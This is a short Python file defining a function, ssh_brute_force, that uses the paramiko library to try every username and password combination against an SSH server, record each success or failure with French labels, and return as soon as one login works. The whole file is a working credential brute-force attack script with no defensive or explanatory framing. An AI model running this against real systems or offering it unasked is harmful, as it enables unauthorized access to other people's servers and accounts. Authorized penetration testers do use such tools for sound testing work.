import paramiko
import time

def ssh_brute_force(target, usernames, passwords):
    report_lines = []
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in usernames:
        for password in passwords:
            try:
                client.connect(target, username=username, password=password, timeout=5)
                report_lines.append(f"Succès : {username}:{password}")
                client.close()
                return "\n".join(report_lines)
            except paramiko.AuthenticationException:
                report_lines.append(f"Échec : {username}:{password}")
            except Exception as e:
                report_lines.append(f"Erreur : {e}")
    
    return "\n".join(report_lines)
